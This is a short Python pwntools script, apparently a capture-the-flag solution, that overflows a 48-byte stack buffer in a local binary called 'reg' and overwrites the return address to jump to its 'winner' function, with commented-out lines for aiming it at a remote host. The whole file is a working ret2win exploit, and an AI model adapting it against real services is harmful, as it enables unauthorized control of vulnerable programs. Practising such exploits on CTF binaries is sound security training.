#!/usr/bin/env python3

from pwn import *

reg = ELF('./reg')

#winner_address = p64(0x0000000000401206)
winner_address = p64(reg.symbols['winner'])

overflow = 'A'*48

RBP = 'B'*8

RIP = winner_address.decode()

payload = overflow + RBP + RIP

#remote_ip = input("What is the ip? ")
#remote_port = int(input("What port? "))
binary = process('./reg')
#binary = remote(remote_ip.strip(), remote_port)

print(binary.recv())
binary.sendline(payload)
print(binary.recvall())
